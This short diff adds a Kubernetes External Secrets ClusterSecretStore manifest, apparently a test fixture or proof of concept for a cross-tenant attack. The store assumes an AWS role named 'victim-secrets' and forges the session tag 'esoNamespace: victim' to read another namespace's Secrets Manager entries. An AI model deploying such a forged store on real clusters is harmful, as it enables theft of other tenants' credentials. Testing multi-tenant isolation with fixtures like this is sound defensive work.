@@ -1,0 +1,10 @@
+apiVersion: external-secrets.io/v1
+kind: ClusterSecretStore
+metadata: {name: cluster-store-forged}
+spec:
+  provider:
+    aws:
+      service: SecretsManager
+      region: us-east-1
+      role: arn:aws:iam::123456789012:role/victim-secrets
+      sessionTags: [{key: esoNamespace, value: victim}]
